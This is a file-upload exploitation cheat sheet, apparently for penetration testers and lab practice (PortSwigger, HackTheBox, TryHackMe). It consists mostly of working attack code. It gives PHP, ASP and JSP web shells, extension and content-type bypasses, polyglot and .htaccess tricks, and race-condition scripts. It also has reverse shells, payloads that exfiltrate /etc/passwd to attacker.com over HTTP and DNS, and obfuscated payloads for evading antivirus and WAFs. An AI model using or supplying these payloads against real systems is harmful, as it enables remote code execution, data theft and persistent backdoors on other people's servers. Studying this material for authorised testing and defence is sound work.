# File Upload Vulnerabilities - Complete Cheat Sheet

## Table of Contents
1. [Basic Web Shell Payloads](#basic-web-shell-payloads)
2. [Extension Bypass Techniques](#extension-bypass-techniques)
3. [Content-Type Manipulation](#content-type-manipulation)
4. [Magic Bytes & File Signatures](#magic-bytes--file-signatures)
5. [Polyglot File Creation](#polyglot-file-creation)
6. [Path Traversal in Uploads](#path-traversal-in-uploads)
7. [Apache .htaccess Exploits](#apache-htaccess-exploits)
8. [Race Condition Exploitation](#race-condition-exploitation)
9. [Burp Suite Commands](#burp-suite-commands)
10. [Testing Methodology](#testing-methodology)
11. [Common Payloads Reference](#common-payloads-reference)

---

## Basic Web Shell Payloads

### PHP Web Shells
```php
# Simple command execution
<?php system($_GET['cmd']); ?>

# File read payload
<?php echo file_get_contents('/etc/passwd'); ?>

# Specific target file
<?php echo file_get_contents('/home/carlos/secret'); ?>

# Full web shell with output
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>

# Minimal shell
<?=`$_GET[0]`?>

# Alternative syntax
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
```

### ASP/ASPX Web Shells
```asp
# Classic ASP
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Response.Write(oScript.Exec("cmd /c " & Request.QueryString("cmd")).StdOut.ReadAll)
%>

# ASP.NET (ASPX)
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
```

### JSP Web Shells
```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
%>
```

---

## Extension Bypass Techniques

### Case Variation
```
exploit.pHp
exploit.PhP
exploit.PHp
exploit.aSp
exploit.aSpX
```

### Double Extensions
```
exploit.php.jpg
exploit.php.png
exploit.php.gif
exploit.php.pdf
exploit.jpg.php
exploit.png.php
```

### Trailing Characters
```
exploit.php.
exploit.php..
exploit.php...
exploit.php%20
exploit.php%0a
exploit.php%00
exploit.php%0d%0a
exploit.php/
exploit.php.\
```

### Null Byte Injection
```
exploit.php%00.jpg
exploit.php%00.png
exploit.php\x00.jpg
exploit.asp%00.png
exploit.jsp%00.gif
```

### URL Encoding
```
exploit%2Ephp
exploit.php%20
exploit%2easp
test.asp%00.jpg
```

### Unicode/UTF-8 Encoding
```
exploit.ph\u0070
exploit.%u0070hp
xC0%AE (Unicode representation of .)
xC4%AE (alternate encoding)
```

### Alternative Extensions

#### PHP Alternatives
```
.php
.php3
.php4
.php5
.php7
.pht
.phtml
.phar
.phpt
.pgif
.phtm
.inc
```

#### ASP Alternatives
```
.asp
.aspx
.asa
.cer
.ashx
.asmx
.config
```

#### JSP Alternatives
```
.jsp
.jspx
.jsw
.jsv
.jspf
```

#### Other Server-Side Extensions
```
.pl (Perl)
.py (Python)
.cgi
.sh
.rb (Ruby)
.exe
.dll
.msi
```

---

## Content-Type Manipulation

### Changing MIME Type in Request
```http
# Original request
Content-Type: application/x-php

# Modified to bypass
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
Content-Type: text/plain
```

### Burp Suite Modification
```
1. Intercept upload request
2. Locate multipart form data section
3. Find: Content-Type: application/x-php
4. Replace with: Content-Type: image/jpeg
5. Forward request
```

### Multiple Content-Type Headers
```http
Content-Type: image/jpeg
Content-Type: application/x-php
```

### Common Valid MIME Types
```
image/jpeg
image/png
image/gif
image/bmp
image/webp
image/svg+xml
application/pdf
text/plain
application/octet-stream
```

---

## Magic Bytes & File Signatures

### Adding Magic Bytes to Scripts

#### JPEG Magic Bytes
```
Hex: FF D8 FF E0
Add to shell:
printf '\xFF\xD8\xFF\xE0' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php
```

#### PNG Magic Bytes
```
Hex: 89 50 4E 47 0D 0A 1A 0A
Add to shell:
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php
```

#### GIF Magic Bytes
```
Hex: 47 49 46 38 39 61 (GIF89a)
Add to shell:
echo 'GIF89a' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php

# Alternative GIF87a
echo 'GIF87a' > exploit.php
```

#### PDF Magic Bytes
```
Hex: 25 50 44 46 (%PDF)
echo '%PDF-1.4' > exploit.php
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php
```

### File Signature Reference Table

| File Type | Magic Bytes (Hex) | ASCII Representation |
|-----------|-------------------|---------------------|
| JPEG | FF D8 FF E0/E1/E2 | ÿØÿà |
| PNG | 89 50 4E 47 0D 0A 1A 0A | .PNG.... |
| GIF | 47 49 46 38 | GIF8 |
| PDF | 25 50 44 46 | %PDF |
| ZIP | 50 4B 03 04 | PK.. |
| BMP | 42 4D | BM |
| WEBP | 52 49 46 46 ... 57 45 42 50 | RIFF...WEBP |
| MP4 | 66 74 79 70 | ftyp |
| AVI | 52 49 46 46 ... 41 56 49 | RIFF...AVI |

### Creating Hybrid Files
```bash
# Combine image and PHP
cat valid-image.jpg exploit.php > hybrid.php

# JPEG + PHP
printf '\xFF\xD8\xFF\xE0' > hybrid.php
cat exploit.php >> hybrid.php

# PNG + PHP
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > hybrid.php
cat exploit.php >> hybrid.php
```

---

## Polyglot File Creation

### Using ExifTool (EXIF Metadata Injection)

#### Basic Polyglot Creation
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

#### Various EXIF Fields for Code Injection
```bash
# Using Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using DocumentName field
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using Artist field
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using Copyright field
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using ImageDescription
exiftool -ImageDescription='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

#### Multi-Line Payload
```bash
exiftool -Comment='<?php
if(isset($_GET["cmd"])){
    system($_GET["cmd"]);
}
?>' image.jpg -o shell.php
```

### Using ImageMagick/GraphicsMagick
```bash
# Create image with text overlay containing PHP
convert -size 100x100 xc:white -pointsize 10 -annotate +10+10 '<?php system($_GET["cmd"]); ?>' polyglot.png

# Or embed in existing image
convert image.jpg -pointsize 5 -annotate +1+1 '<?php phpinfo(); ?>' shell.jpg
```

### Manual Polyglot Creation
```bash
# JPEG polyglot
cat image.jpg > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php

# PNG polyglot - inject into PNG chunk
# PNG files have chunks; inject code into text chunk
python3 -c "
import struct
with open('image.png', 'rb') as f:
    data = f.read()
# Add tEXt chunk with PHP payload
payload = b'tEXt' + b'comment\x00' + b'<?php system(\$_GET[\"cmd\"]); ?>'
chunk = struct.pack('>I', len(payload)-4) + payload + struct.pack('>I', 0)
with open('polyglot.php', 'wb') as f:
    f.write(data[:8] + chunk + data[8:])
"
```

### GIF Polyglot
```bash
# GIF allows comments
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Or with valid GIF structure
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00' > base.gif
echo '<?php system($_GET["cmd"]); ?>' >> base.gif
mv base.gif shell.php
```

### SVG with Embedded Scripts (XSS Vector)
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
  <script type="text/javascript">
    alert('XSS');
  </script>
</svg>
```

---

## Path Traversal in Uploads

### Basic Traversal Sequences
```
../exploit.php
../../exploit.php
../../../exploit.php
..\/exploit.php
..\exploit.php
```

### URL-Encoded Traversal
```
..%2fexploit.php
..%2f..%2fexploit.php
..%5cexploit.php
%2e%2e%2fexploit.php
%2e%2e%5cexploit.php
```

### Double URL-Encoding
```
..%252fexploit.php
%252e%252e%252fexploit.php
```

### Unicode Encoding
```
..%c0%afexploit.php
..%c1%9cexploit.php
..%c0%2fexploit.php
```

### Absolute Path Upload
```
/var/www/html/exploit.php
C:\inetpub\wwwroot\exploit.php
/usr/share/nginx/html/exploit.php
```

### Modifying Content-Disposition
```http
# Original
Content-Disposition: form-data; name="avatar"; filename="exploit.php"

# Path traversal attempts
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Disposition: form-data; name="avatar"; filename="../../web/exploit.php"
Content-Disposition: form-data; name="avatar"; filename="..%2f..%2fexploit.php"
```

### Bypass Traversal Filters
```
# If ../ is stripped
....//exploit.php  (becomes ../ after strip)
..././exploit.php

# If both ../ and ..\ are stripped
..;/exploit.php
..\/exploit.php (mixed separators)
```

---

## Apache .htaccess Exploits

### Basic .htaccess Upload

#### Enable PHP Execution for Custom Extension
```apache
AddType application/x-httpd-php .l33t
AddType application/x-httpd-php .shell
AddType application/x-httpd-php .pwn
AddType application/x-httpd-php .hacker
```

#### Multiple Extensions
```apache
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .pdf
```

#### Using AddHandler Instead
```apache
AddHandler application/x-httpd-php .jpg
SetHandler application/x-httpd-php
```

### Advanced .htaccess Configurations

#### Execute All Files as PHP
```apache
SetHandler application/x-httpd-php
```

#### Override File Type Restrictions
```apache
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

#### Disable Security Modules
```apache
<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>
```

#### Alternative Handlers
```apache
AddHandler cgi-script .jpg
Options +ExecCGI
AddType application/x-httpd-php .jpg
```

#### PHP Configuration Override
```apache
php_value auto_prepend_file /var/www/uploads/shell.jpg
```

### .htaccess Upload Procedure
```
1. Create .htaccess file with:
   AddType application/x-httpd-php .jpg

2. Upload .htaccess to target directory

3. Upload shell.jpg containing PHP code

4. Access /uploads/shell.jpg

5. Server executes PHP despite .jpg extension
```

### IIS Equivalent (web.config)

#### Basic web.config for PHP Execution
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI"
                 path="*.jpg"
                 verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\PHP\php-cgi.exe"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

#### ASP.NET Handler Mapping
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="JPG_Handler"
                 path="*.jpg"
                 verb="GET,HEAD,POST"
                 modules="IsapiModule"
                 scriptProcessor="%windir%\system32\inetsrv\asp.dll"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

---

## Race Condition Exploitation

### Understanding Race Conditions
Race conditions exploit timing windows where:
1. File is uploaded to accessible directory
2. Validation checks run (virus scan, content check)
3. File is deleted if validation fails

**Attack window**: Time between upload and deletion

### Manual Race Condition Attack
```bash
# Terminal 1: Continuous upload
while true; do
  curl -X POST -F "file=@shell.php" http://target.com/upload
  sleep 0.1
done

# Terminal 2: Continuous access attempt
while true; do
  curl http://target.com/uploads/shell.php?cmd=whoami
  sleep 0.1
done
```

### Using Burp Suite Repeater
```
1. Capture POST upload request (shell.php)
2. Send to Repeater
3. Capture GET request to uploaded file path
4. Send to Repeater
5. Arrange windows side-by-side
6. Rapidly alternate: POST -> GET -> POST -> GET
7. Some GET requests will execute before deletion
```

### Burp Turbo Intruder Script

#### Basic Race Condition Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    # POST request to upload shell.php
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=<YOUR-SESSION>

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

<CSRF-TOKEN>
------WebKitFormBoundary--
'''

    # GET request to execute uploaded file
    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
Host: target.com
Cookie: session=<YOUR-SESSION>

'''

    # Queue requests with gate synchronization
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Open gate - all requests sent simultaneously
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

#### Advanced Multi-Threaded Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)

    upload_request = '''<UPLOAD-REQUEST>'''
    access_request = '''<ACCESS-REQUEST>'''

    # Send 100 requests in parallel
    for i in range(50):
        engine.queue(upload_request, gate='race1')
        engine.queue(access_request, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    # Flag successful exploitation
    if '200 OK' in req.response and len(req.response) > 500:
        table.add(req)
```

### Python Race Condition Script
```python
import requests
import threading

target = "http://target.com"
upload_url = f"{target}/upload"
access_url = f"{target}/uploads/shell.php"

def upload_file():
    files = {'file': open('shell.php', 'rb')}
    while True:
        try:
            requests.post(upload_url, files=files)
        except:
            pass

def access_file():
    while True:
        try:
            r = requests.get(f"{access_url}?cmd=id")
            if r.status_code == 200 and 'uid=' in r.text:
                print("[+] Success!")
                print(r.text)
                exit(0)
        except:
            pass

# Start 10 upload threads
for i in range(10):
    threading.Thread(target=upload_file).start()

# Start 10 access threads
for i in range(10):
    threading.Thread(target=access_file).start()
```

### Bash Race Condition Script
```bash
#!/bin/bash

TARGET="http://target.com"
UPLOAD_URL="$TARGET/upload"
ACCESS_URL="$TARGET/uploads/shell.php"

# Upload function
upload() {
    while true; do
        curl -s -X POST -F "file=@shell.php" $UPLOAD_URL &
    done
}

# Access function
access() {
    while true; do
        RESULT=$(curl -s "$ACCESS_URL?cmd=id")
        if [[ $RESULT == *"uid="* ]]; then
            echo "[+] Success: $RESULT"
            killall curl
            exit 0
        fi
    done
}

# Start 5 upload processes
for i in {1..5}; do
    upload &
done

# Start 5 access processes
for i in {1..5}; do
    access &
done

wait
```

---

## Burp Suite Commands

### Proxy Configuration
```
1. Proxy > Intercept > Turn Intercept On
2. Upload file through browser
3. Intercept POST request containing multipart/form-data
4. Right-click > Send to Repeater
5. Modify filename, Content-Type, or content
6. Click "Send" to test
```

### HTTP History Filtering
```
1. Proxy > HTTP history
2. Filter bar > Show images checkbox (enable)
3. Locate GET /files/avatars/<filename>
4. Right-click > Send to Repeater
```

### Intruder for Extension Fuzzing
```
1. Send upload request to Intruder
2. Position payload marker on filename extension:
   filename="exploit.§php§"
3. Payloads tab > Load extension wordlist:
   php, php3, php4, php5, pht, phtml, phar
4. Start attack
5. Analyze responses for successful uploads
```

### Repeater Workflow
```
1. Capture upload POST request > Send to Repeater
2. Capture file access GET request > Send to Repeater
3. Modify POST request (filename, Content-Type, content)
4. Send POST request
5. Send GET request to verify execution
6. Iterate on modifications
```

### Comparer for Response Analysis
```
1. Select two responses in Proxy history or Intruder results
2. Right-click > Send to Comparer
3. Comparer > Compare responses
4. Identify differences in error messages, lengths, status codes
```

### Turbo Intruder Installation
```
1. Extender > BApp Store
2. Search "Turbo Intruder"
3. Click Install
4. Usage: Right-click request > Extensions > Turbo Intruder > Send to turbo intruder
```

### Logger++ for Detailed Analysis
```
1. Install Logger++ from BApp Store
2. Automatically logs all requests with detailed metadata
3. Use filters to find:
   - Status code: 200
   - Response length: > 500
   - MIME type: text/html
   - Request path: /uploads/ OR /files/
```

---

## Testing Methodology

### Phase 1: Information Gathering
```
1. Identify upload functionality
   - Profile picture uploads
   - Document uploads
   - Import/export features
   - Avatar/logo uploads
   - File attachment features

2. Observe normal upload behavior
   - Upload legitimate file (JPEG, PNG, PDF)
   - Note upload path from Burp history
   - Identify file storage location
   - Check if filename is preserved or randomized
   - Test file retrieval mechanism

3. Analyze server responses
   - Success messages
   - Error messages
   - Redirect behavior
   - Response headers (Server type, X-Powered-By)
```

### Phase 2: Validation Testing

#### Test Extension Validation
```
1. Upload shell.php directly
2. If blocked, try:
   - Case variations: shell.pHp
   - Double extension: shell.php.jpg
   - Null byte: shell.php%00.jpg
   - Trailing char: shell.php.
   - Alternatives: shell.php5, shell.phtml
3. Document which extensions are blocked vs allowed
```

#### Test Content-Type Validation
```
1. Intercept upload request in Burp
2. Change Content-Type header from application/x-php to:
   - image/jpeg
   - image/png
   - image/gif
3. Check if upload succeeds
```

#### Test Magic Byte Validation
```
1. Create file with valid image header:
   printf '\xFF\xD8\xFF\xE0' > shell.php
   echo '<?php system($_GET["cmd"]); ?>' >> shell.php
2. Upload and test execution
3. Try other formats (PNG, GIF, PDF)
```

#### Test File Content Validation
```
1. Create polyglot file (valid image + PHP code)
2. Use ExifTool to embed payload in metadata
3. Upload and test execution
```

### Phase 3: Exploitation Techniques

#### Technique Selection Matrix
| Validation Type | Bypass Method |
|----------------|---------------|
| Extension blacklist | Alternate extensions, case variation |
| Extension whitelist | Null byte, double extension, .htaccess |
| Content-Type check | Modify Content-Type header |
| Magic byte check | Add valid magic bytes to shell |
| Full content scan | Polyglot file, metadata injection |
| No validation | Direct shell upload |

### Phase 4: Post-Upload Verification
```
1. Locate uploaded file path
   - Check Burp history for GET requests
   - Try predictable paths: /uploads/, /files/, /avatars/
   - Check for path disclosure in responses

2. Test execution
   - Request file via GET
   - Add ?cmd=id parameter
   - Check if PHP executes or returns as plain text

3. If execution blocked
   - Try path traversal to different directory
   - Upload .htaccess to enable execution
   - Test race condition vulnerability
```

### Phase 5: Full Exploitation
```
1. Establish working upload method
2. Upload functional web shell
3. Execute commands and extract data
4. Document exploitation path
5. Prepare proof of concept
```

---

## Common Payloads Reference

### Quick Test Payloads

#### Minimal PHP Shell
```php
<?php system($_GET[0]); ?>
# Usage: shell.php?0=id
```

#### PHP Info Check
```php
<?php phpinfo(); ?>
```

#### File Read Test
```php
<?php echo file_get_contents('/etc/passwd'); ?>
```

#### Directory Listing
```php
<?php echo '<pre>' . shell_exec('ls -la') . '</pre>'; ?>
```

### Full-Featured Web Shells

#### PHP Command Shell
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

Usage: shell.php?cmd=whoami
```

#### PHP File Manager
```php
<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$files = scandir($dir);
echo "<h3>Directory: " . htmlspecialchars($dir) . "</h3>";
foreach($files as $file) {
    $path = $dir . '/' . $file;
    echo "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($file) . "</a><br>";
}
?>
```

### Reverse Shell Payloads

#### PHP Reverse Shell
```php
<?php
$ip = '10.10.10.10';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

#### Bash Reverse Shell (via PHP)
```php
<?php system('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"'); ?>
```

#### Python Reverse Shell (via PHP)
```php
<?php system('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'); ?>
```

### Exfiltration Payloads

#### Send Data via HTTP
```php
<?php
$data = file_get_contents('/etc/passwd');
file_get_contents('http://attacker.com/receive.php?data=' . base64_encode($data));
?>
```

#### Send Data via DNS
```php
<?php
$data = file_get_contents('/etc/passwd');
$encoded = bin2hex($data);
gethostbyname($encoded . '.attacker.com');
?>
```

### Obfuscated Payloads

#### Base64 Encoded
```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
# Decodes to: system($_GET['cmd']);
```

#### ROT13 Encoded
```php
<?php eval(str_rot13('flfgrz($_TRG[\'pzq\']);')); ?>
```

#### Variable Function Execution
```php
<?php $a='system'; $a($_GET['cmd']); ?>
```

---

## Real-World Attack Scenarios

### Scenario 1: Profile Picture Upload RCE
```
1. Application allows profile picture upload
2. No validation on file type
3. Files stored in /uploads/profiles/<user_id>/
4. Directory has PHP execution enabled

Attack:
- Upload shell.php as profile picture
- Access: /uploads/profiles/123/shell.php?cmd=whoami
- Result: Remote Code Execution
```

### Scenario 2: Document Management System
```
1. Application allows document upload (.pdf, .doc, .xls)
2. Extension whitelist enforced
3. No content validation
4. Apache server with .htaccess enabled

Attack:
- Upload .htaccess: AddType application/x-httpd-php .pdf
- Upload shell code as malicious.pdf
- Access: /documents/malicious.pdf
- Result: PDF file executed as PHP
```

### Scenario 3: WordPress Plugin Upload
```
1. WordPress site with custom theme uploader
2. Checks for .zip extension
3. Extracts contents to /wp-content/themes/

Attack:
- Create malicious-theme.zip containing shell.php
- Upload via theme installer
- Access: /wp-content/themes/malicious-theme/shell.php
- Result: Full WordPress compromise
```

### Scenario 4: Avatar Upload with Race Condition
```
1. Application scans uploaded files for malware
2. Files temporarily accessible before scan completes
3. Malicious files deleted after 2-3 seconds

Attack:
- Use Turbo Intruder to upload shell.php
- Simultaneously send 100 GET requests to access file
- Some requests execute before deletion
- Result: Command execution in timing window
```

### Scenario 5: Image Gallery XSS
```
1. Image hosting site allows SVG uploads
2. No sanitization of SVG content
3. Rendered in user browsers

Attack:
- Upload malicious.svg with embedded JavaScript
- Victim views image
- JavaScript executes in victim's browser
- Result: Stored XSS, session hijacking
```

---

## Defense Evasion

### Bypassing Antivirus/WAF

#### Code Obfuscation
```php
# Use variable functions
<?php $a=$_GET['a'];$b=$_GET['b'];$a($b); ?>
# Usage: shell.php?a=system&b=whoami

# String concatenation
<?php $c='sys'.'tem';$c($_GET[0]); ?>

# Character code assembly
<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET[0]); ?>
```

#### Alternative Code Execution
```php
# assert() function
<?php assert($_GET['c']); ?>

# preg_replace() with /e modifier (older PHP)
<?php preg_replace('/.*/e', $_GET['c'], ''); ?>

# create_function()
<?php $f=create_function('',$_GET['c']);$f(); ?>

# Array functions
<?php array_map('system',array($_GET['c'])); ?>
```

### Bypassing File Size Restrictions
```
1. Upload minimal shell first
2. Use shell to upload larger files
3. Or use shell to download full-featured backdoor
```

### Bypassing Filename Restrictions
```
# If special characters blocked
shell.php -> shell1.php
shell.php -> backup.php
shell.php -> update.php
shell.php -> config.php

# Blend with legitimate files
index.php, admin.php, login.php, config.php
```

---

## Automated Scanning Tools

### fuxploider
```bash
# Install
git clone https://github.com/almandin/fuxploider
cd fuxploider

# Basic scan
python3 fuxploider.py --url http://target.com/upload

# With extensions wordlist
python3 fuxploider.py --url http://target.com/upload --extensions php,php3,php4,php5,phtml

# Advanced scan with payloads
python3 fuxploider.py --url http://target.com/upload --payloads payloads/
```

### wfuzz
```bash
# Fuzz file extensions
wfuzz -c -z file,extensions.txt http://target.com/upload?file=shell.FUZZ

# Fuzz with file upload
wfuzz -c -z file,shells.txt -H "Content-Type: multipart/form-data" --data "file=@FUZZ" http://target.com/upload
```

### Upload Scanner (Burp Extension)
```
1. Install from BApp Store
2. Right-click upload request > Scan with Upload Scanner
3. Automatically tests multiple bypass techniques
4. Reports successful uploads and execution
```

---

## Lab Practice Checklist

### PortSwigger Labs
- [ ] Remote code execution via web shell upload
- [ ] Web shell upload via Content-Type restriction bypass
- [ ] Web shell upload via path traversal
- [ ] Web shell upload via extension blacklist bypass
- [ ] Web shell upload via obfuscated file extension
- [ ] Remote code execution via polyglot web shell upload
- [ ] Web shell upload via race condition

### HackTheBox Machines with File Upload
- [ ] Cronos
- [ ] Popcorn
- [ ] Bashed
- [ ] Nineveh
- [ ] FriendZone

### TryHackMe Rooms
- [ ] Upload Vulnerabilities
- [ ] File Upload Bypass
- [ ] Web Application Security

---

## Quick Reference Commands

### Create Basic Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Add JPEG Magic Bytes
```bash
printf '\xFF\xD8\xFF\xE0' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Create Polyglot with ExifTool
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

### Test Shell Execution
```bash
curl http://target.com/uploads/shell.php?cmd=id
curl http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
curl http://target.com/uploads/shell.php?cmd=ls+-la
```

### Start Listener for Reverse Shell
```bash
nc -lvnp 4444
```

---

## Additional Resources

- **OWASP File Upload Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- **PortSwigger File Upload Labs**: https://portswigger.net/web-security/file-upload
- **HackTricks File Upload**: https://book.hacktricks.xyz/pentesting-web/file-upload
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types
